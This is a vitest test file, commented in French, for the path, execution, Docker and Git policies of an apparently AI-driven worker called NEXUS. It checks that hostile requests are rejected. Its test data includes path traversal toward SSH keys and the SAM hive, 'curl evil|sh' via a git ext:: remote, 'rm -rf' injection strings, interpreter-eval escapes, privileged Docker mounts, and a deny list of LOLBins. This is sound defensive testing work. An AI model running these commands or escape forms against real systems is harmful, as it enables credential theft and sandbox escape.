import { describe, expect, it } from "vitest";
import { PathPolicy } from "../src/policy/path-policy.js";
import { ExecPolicy } from "../src/policy/exec-policy.js";
import { DockerPolicy } from "../src/policy/docker-policy.js";
import { GitPolicy } from "../src/policy/git-policy.js";
import { PolicyViolationError } from "../src/errors.js";
import { FakeFileSystem, ALLOWED_ROOT } from "./fixtures.js";

/**
 * Les politiques sont la frontière réelle du worker.
 *
 * Tout ce que NEXUS peut faire à cette machine passe par elles. Les éprouver
 * séparément, avant même de brancher une capacité, permet de nommer précisément
 * ce qui est refusé — et pourquoi.
 *
 * Les assertions portent sur le **code** d'erreur et sur le motif, pas sur le
 * texte du message : `code` est un contrat public et stable, `message` est
 * technique et destiné aux journaux. Accrocher des tests au second les ferait
 * échouer à la première reformulation, ce qui apprend à ignorer les échecs.
 */

interface CaughtError {
  code?: string;
  userMessage?: string;
  context?: Record<string, unknown>;
}

async function rejectsWith(
  promise: Promise<unknown>,
  code: string,
  reason?: string,
): Promise<CaughtError> {
  const error = await promise.then(
    () => undefined,
    (cause: unknown) => cause as CaughtError,
  );

  expect(error?.code).toBe(code);
  if (reason !== undefined) expect(error?.context?.reason).toBe(reason);
  return error ?? {};
}

function throwsWith(action: () => unknown, code: string, rule?: string): CaughtError {
  let caught: CaughtError | undefined;
  try {
    action();
  } catch (cause) {
    caught = cause as CaughtError;
  }

  expect(caught?.code).toBe(code);
  if (rule !== undefined) expect(caught?.context?.rule).toBe(rule);
  return caught ?? {};
}

function makePathPolicy(fileSystem = new FakeFileSystem()): PathPolicy {
  return new PathPolicy({
    allowedRoots: [ALLOWED_ROOT],
    realpath: (candidate) => fileSystem.realpath(candidate),
  });
}

describe("politique de chemins", () => {
  it("accepte un chemin sous une racine autorisée", async () => {
    await expect(makePathPolicy().resolve("C:\\Projets\\leynai\\README.md")).resolves.toBe(
      "C:\\Projets\\leynai\\README.md",
    );
  });

  it("accepte la racine elle-même", async () => {
    await expect(makePathPolicy().resolve(ALLOWED_ROOT)).resolves.toBe(ALLOWED_ROOT);
  });

  it("refuse un chemin hors des racines", async () => {
    await rejectsWith(
      makePathPolicy().resolve("C:\\Users\\moi\\Documents\\impots.pdf"),
      "PATH_NOT_ALLOWED",
      "hors des racines autorisées",
    );
  });

  it("refuse une remontée par ..", async () => {
    await rejectsWith(
      makePathPolicy().resolve("C:\\Projets\\..\\Windows\\System32\\config\\SAM"),
      "PATH_NOT_ALLOWED",
    );
  });

  it("refuse une remontée déguisée en sous-chemin", async () => {
    await rejectsWith(
      makePathPolicy().resolve("C:\\Projets\\leynai\\..\\..\\Users\\moi\\.ssh\\id_rsa"),
      "PATH_NOT_ALLOWED",
    );
  });

  it("refuse un chemin voisin qui partage le préfixe de la racine", async () => {
    // « C:\Projets-secrets » commence par « C:\Projets » : une comparaison de
    // chaînes le laisserait passer.
    await rejectsWith(
      makePathPolicy().resolve("C:\\Projets-secrets\\notes.txt"),
      "PATH_NOT_ALLOWED",
      "hors des racines autorisées",
    );
  });

  it("refuse un chemin relatif", async () => {
    await rejectsWith(
      makePathPolicy().resolve("..\\..\\secret.txt"),
      "PATH_NOT_ALLOWED",
      "chemin relatif",
    );
  });

  it("refuse une évasion par lien symbolique", async () => {
    const fileSystem = new FakeFileSystem();
    // Un dossier apparemment sous la racine pointe en réalité ailleurs.
    fileSystem.links.set("C:\\Projets\\raccourci", "C:\\Users\\moi\\cle");

    await rejectsWith(
      makePathPolicy(fileSystem).resolve("C:\\Projets\\raccourci\\id_ed25519"),
      "PATH_NOT_ALLOWED",
    );
  });

  it("refuse un flux de données alternatif", async () => {
    await rejectsWith(
      makePathPolicy().resolve("C:\\Projets\\notes.txt:cache"),
      "PATH_NOT_ALLOWED",
      "flux de données alternatif",
    );
  });

  it("refuse un chemin réseau UNC", async () => {
    await rejectsWith(
      makePathPolicy().resolve("\\\\serveur\\partage\\fichier"),
      "PATH_NOT_ALLOWED",
      "chemin réseau UNC",
    );
  });

  it("refuse un préfixe de chemin étendu", async () => {
    await rejectsWith(
      makePathPolicy().resolve("\\\\?\\C:\\Projets\\x"),
      "PATH_NOT_ALLOWED",
      "préfixe de chemin étendu",
    );
  });

  it("refuse un nom de périphérique réservé", async () => {
    await rejectsWith(
      makePathPolicy().resolve("C:\\Projets\\NUL"),
      "PATH_NOT_ALLOWED",
      "nom de périphérique réservé",
    );
  });

  it("refuse un caractère nul", async () => {
    await rejectsWith(
      makePathPolicy().resolve("C:\\Projets\\ok.txt\0..\\..\\secret"),
      "PATH_NOT_ALLOWED",
      "caractère nul",
    );
  });

  it("refuse un dossier de secrets même sous une racine autorisée", async () => {
    await rejectsWith(
      makePathPolicy().resolve("C:\\Projets\\.ssh\\id_rsa"),
      "PATH_NOT_ALLOWED",
      "emplacement contenant des secrets",
    );
  });

  it("interdit tout quand aucune racine n'est configurée", async () => {
    const policy = new PathPolicy({ allowedRoots: [] });
    await rejectsWith(
      policy.resolve("C:\\Projets\\x"),
      "PATH_NOT_ALLOWED",
      "aucune racine autorisée n'est configurée",
    );
  });

  it("ignore la casse, comme Windows", async () => {
    await expect(makePathPolicy().resolve("c:\\projets\\LeynAI\\x.md")).resolves.toContain(
      "projets",
    );
  });

  it("ne révèle pas le chemin demandé dans le message affiché", async () => {
    // Le chemin va dans le contexte de l'erreur, jamais dans `userMessage` :
    // révéler l'arborescence à un appelant qui n'y a pas accès est déjà une fuite.
    const error = await rejectsWith(
      makePathPolicy().resolve("C:\\Users\\moi\\banque\\rib.pdf"),
      "PATH_NOT_ALLOWED",
    );

    expect(error.userMessage).not.toContain("rib.pdf");
    expect(error.context?.requested).toContain("rib.pdf");
  });
});

describe("politique d'exécution", () => {
  const env = { PATH: "C:\\Windows", TEMP: "C:\\Temp", SECRET_TOKEN: "sk-nedoitpassortir" };

  it("accepte un exécutable de la liste", () => {
    const policy = new ExecPolicy({ allowedExecutables: ["git"] });
    expect(policy.validate({ executable: "git", args: ["status"] }, env)).toMatchObject({
      executable: "git",
      args: ["status"],
    });
  });

  it("refuse un exécutable hors liste", () => {
    const policy = new ExecPolicy({ allowedExecutables: ["git"] });
    throwsWith(
      () => policy.validate({ executable: "curl", args: [] }, env),
      "EXECUTABLE_NOT_ALLOWED",
    );
  });

  it("refuse un binaire d'exécution indirecte même s'il est autorisé", () => {
    // Le cas qui compte : quelqu'un ajoute `rundll32` à sa configuration en
    // croyant que `browser.open` en a besoin. Il n'en a pas besoin — il
    // l'invoque lui-même avec une adresse validée — et cette bonne intention
    // ouvrirait l'exécution arbitraire :
    //   rundll32 shell32.dll,ShellExec_RunDLL <n'importe quoi>
    //
    // Une liste d'autorisation qu'une erreur de configuration suffit à vider de
    // son sens n'est pas une protection.
    const policy = new ExecPolicy({
      allowedExecutables: ["git", "rundll32", "powershell", "mshta", "certutil"],
    });

    for (const executable of ["rundll32", "powershell", "mshta", "certutil"]) {
      throwsWith(() => policy.validate({ executable, args: [] }, env), "WORKER_POLICY_VIOLATION");
    }

    // Et ce qui est légitimement autorisé passe toujours.
    expect(() => policy.validate({ executable: "git", args: ["status"] }, env)).not.toThrow();
  });

  it("refuse un chemin d'exécutable", () => {
    // Sans cette règle, « C:\ailleurs\git.exe » porterait le même nom de base
    // qu'un exécutable autorisé sans être le même programme.
    const policy = new ExecPolicy({ allowedExecutables: ["git"] });
    throwsWith(
      () => policy.validate({ executable: "C:\\ailleurs\\git.exe", args: [] }, env),
      "WORKER_POLICY_VIOLATION",
      "executable.path",
    );
  });

  it("refuse un fichier de commandes, qui repasserait par cmd.exe", () => {
    const policy = new ExecPolicy({ allowedExecutables: ["deploy.bat"] });
    throwsWith(
      () => policy.validate({ executable: "deploy.bat", args: [] }, env),
      "WORKER_POLICY_VIOLATION",
      "executable.extension",
    );
  });

  it("laisse passer des métacaractères shell : ce sont des arguments", () => {
    // Il n'y a pas de shell. « ; rm -rf . » est un argument absurde pour git,
    // pas une seconde commande. Le filtrer donnerait l'illusion trompeuse que
    // c'est le filtre qui protège, alors que c'est l'absence de shell.
    const policy = new ExecPolicy({ allowedExecutables: ["git"] });
    const validated = policy.validate(
      { executable: "git", args: ["log", "; rm -rf . && curl evil.example"] },
      env,
    );
    expect(validated.args[1]).toBe("; rm -rf . && curl evil.example");
  });

  it("refuse un argument contenant un caractère nul", () => {
    const policy = new ExecPolicy({ allowedExecutables: ["git"] });
    throwsWith(
      () => policy.validate({ executable: "git", args: ["log\0--exec"] }, env),
      "WORKER_POLICY_VIOLATION",
      "args.nul",
    );
  });

  it("refuse un nombre d'arguments absurde", () => {
    const policy = new ExecPolicy({ allowedExecutables: ["git"], maxArgs: 3 });
    throwsWith(
      () => policy.validate({ executable: "git", args: ["a", "b", "c", "d"] }, env),
      "WORKER_POLICY_VIOLATION",
      "args.count",
    );
  });

  it("ne transmet que les variables d'environnement autorisées", () => {
    const policy = new ExecPolicy({ allowedExecutables: ["git"], allowedEnv: ["PATH", "TEMP"] });
    const validated = policy.validate({ executable: "git", args: [] }, env);

    expect(validated.env).toEqual({ PATH: "C:\\Windows", TEMP: "C:\\Temp" });
    expect(validated.env.SECRET_TOKEN).toBeUndefined();
  });

  it("refuse une variable d'environnement demandée hors liste", () => {
    const policy = new ExecPolicy({ allowedExecutables: ["git"], allowedEnv: ["PATH"] });
    throwsWith(
      () =>
        policy.validate({ executable: "git", args: [], env: { AWS_SECRET_ACCESS_KEY: "x" } }, env),
      "WORKER_POLICY_VIOLATION",
      "env.notAllowed",
    );
  });
});

describe("politique Docker", () => {
  it("accepte une sous-commande de consultation", () => {
    expect(new DockerPolicy().validate({ subcommand: "ps", args: ["-a"] })).toEqual(["ps", "-a"]);
  });

  it("refuse une sous-commande hors liste", () => {
    throwsWith(
      () => new DockerPolicy().validate({ subcommand: "run", args: [] }),
      "WORKER_POLICY_VIOLATION",
      "docker.subcommand",
    );
  });

  it("refuse --privileged même si la sous-commande est autorisée", () => {
    const policy = new DockerPolicy({ allowedSubcommands: ["run"] });
    throwsWith(
      () => policy.validate({ subcommand: "run", args: ["--privileged", "img"] }),
      "WORKER_POLICY_VIOLATION",
      "docker.flag",
    );
  });

  it("refuse le montage du socket Docker", () => {
    const policy = new DockerPolicy({ allowedSubcommands: ["run"] });
    throwsWith(
      () => policy.validate({ subcommand: "run", args: ["-v", "/var/run/docker.sock:/x"] }),
      "WORKER_POLICY_VIOLATION",
      "docker.mount",
    );
  });

  it("refuse le montage d'une racine de disque", () => {
    const policy = new DockerPolicy({ allowedSubcommands: ["run"] });
    throwsWith(
      () => policy.validate({ subcommand: "run", args: ["C:\\:/host"] }),
      "WORKER_POLICY_VIOLATION",
      "docker.rootMount",
    );
  });

  it("distingue consultation et modification", () => {
    expect(DockerPolicy.isMutating("ps")).toBe(false);
    expect(DockerPolicy.isMutating("run")).toBe(true);
  });
});

describe("politique Git", () => {
  it("classe les opérations de lecture en SAFE", () => {
    const policy = new GitPolicy();
    expect(policy.riskFor("status")).toBe("SAFE");
    expect(policy.riskFor("diff")).toBe("SAFE");
    expect(policy.riskFor("branch")).toBe("SAFE");
  });

  it("place checkout au-dessus des autres écritures", () => {
    // C'est la seule opération de la liste capable de détruire un travail non
    // enregistré, sans confirmation et sans retour possible.
    const policy = new GitPolicy();
    expect(policy.riskFor("checkout")).toBe("HIGH");
    expect(policy.riskFor("commit")).toBe("MEDIUM");
  });

  it("autorise la lecture même en mode lecture seule", () => {
    expect(() => new GitPolicy({ allowWrite: false }).assertAllowed("status")).not.toThrow();
  });

  it("refuse l'écriture en mode lecture seule", () => {
    throwsWith(
      () => new GitPolicy({ allowWrite: false }).assertAllowed("pull"),
      "WORKER_POLICY_VIOLATION",
      "git.readOnly",
    );
  });

  it("autorise l'écriture quand la configuration l'accorde", () => {
    expect(() => new GitPolicy({ allowWrite: true }).assertAllowed("commit")).not.toThrow();
  });

  it("accepte un hôte de dépôt autorisé", () => {
    expect(() =>
      new GitPolicy().assertRemoteAllowed("https://github.com/adlan/leynai.git"),
    ).not.toThrow();
  });

  it("accepte la forme SSH abrégée", () => {
    expect(() =>
      new GitPolicy().assertRemoteAllowed("git@github.com:adlan/leynai.git"),
    ).not.toThrow();
  });

  it("refuse un hôte non autorisé", () => {
    throwsWith(
      () => new GitPolicy().assertRemoteAllowed("https://evil.example/x.git"),
      "WORKER_POLICY_VIOLATION",
      "git.remoteHost",
    );
  });

  it("refuse le schéma ext:: qui exécuterait une commande", () => {
    // « git clone ext::sh -c '…' » exécute du code au moment du clone. Sans ce
    // refus, `git.clone` deviendrait une exécution arbitraire contournant toute
    // la politique d'exécution.
    throwsWith(
      () => new GitPolicy().assertRemoteAllowed("ext::sh -c 'curl evil|sh'"),
      "WORKER_POLICY_VIOLATION",
      "git.remoteScheme",
    );
  });

  it("refuse un dépôt local file://", () => {
    throwsWith(
      () => new GitPolicy().assertRemoteAllowed("file:///C:/Windows"),
      "WORKER_POLICY_VIOLATION",
      "git.remoteScheme",
    );
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// H1 — Exécution de code par un programme autorisé
// ─────────────────────────────────────────────────────────────────────────────

describe("H1 — un programme autorisé n'est pas un interpréteur libre", () => {
  const policy = new ExecPolicy({
    allowedExecutables: ["node", "python", "git", "npm", "pnpm", "docker"],
  });
  const env = { PATH: "C:\\Windows" };

  const evasions: [string, string[]][] = [
    ["node", ["-e", "require('fs').readFileSync('C:/Users/x/.ssh/id_rsa')"]],
    ["node", ["--eval=process.exit(1)"]],
    ["node", ["-p", "process.env"]],
    ["node", ["-r", "./charge-utile.js", "script.js"]],
    ["python", ["-c", "import os; os.system('calc')"]],
    ["git", ["-c", "alias.x=!calc", "x"]],
    ["git", ["-c", "core.sshCommand=calc", "clone", "url"]],
    ["npm", ["exec", "paquet-arbitraire"]],
    ["pnpm", ["dlx", "paquet-arbitraire"]],
  ];

  for (const [executable, args] of evasions) {
    it(`refuse ${executable} ${args[0] ?? ""}`, () => {
      // Chacune de ces formes est un appel parfaitement structuré — un
      // exécutable de la liste, des arguments bien formés — qui exécute
      // pourtant du code arbitraire **hors de la politique de chemins**. Le bac
      // à sable du système de fichiers ne vaut que si on les refuse.
      expect(() => policy.validate({ executable, args }, env)).toThrow(PolicyViolationError);
    });
  }

  it("refuse une installation qui exécuterait les scripts des paquets", () => {
    // `npm install` lance les scripts `postinstall` du paquet téléchargé :
    // exécution de code tiers déguisée en gestion de dépendances.
    expect(() => policy.validate({ executable: "npm", args: ["install"] }, env)).toThrow(
      PolicyViolationError,
    );
    expect(() => policy.validate({ executable: "pnpm", args: ["add", "gauche-pad"] }, env)).toThrow(
      PolicyViolationError,
    );
  });

  it("accepte une installation qui les désactive", () => {
    expect(() =>
      policy.validate({ executable: "pnpm", args: ["install", "--ignore-scripts"] }, env),
    ).not.toThrow();
  });

  it("ferme la seconde porte vers le démon Docker", () => {
    // La capacité `docker.execute` a sa politique — drapeaux refusés, montages
    // interdits. `terminal.execute` la contournait entièrement.
    expect(() =>
      policy.validate(
        { executable: "docker", args: ["run", "-v", "C:\\:/host", "--privileged", "alpine"] },
        env,
      ),
    ).toThrow(PolicyViolationError);
  });

  it("laisse passer la consultation Docker", () => {
    expect(() => policy.validate({ executable: "docker", args: ["ps"] }, env)).not.toThrow();
  });

  it("n'entrave pas l'usage voulu", () => {
    // La liste refuse des **formes d'appel**, pas des programmes.
    for (const [executable, args] of [
      ["node", ["script.js"]],
      ["pnpm", ["test"]],
      ["pnpm", ["run", "build"]],
      ["git", ["status", "--porcelain"]],
      ["python", ["analyse.py", "--entree", "donnees.csv"]],
    ] as [string, string[]][]) {
      expect(() => policy.validate({ executable, args }, env), executable).not.toThrow();
    }
  });
});
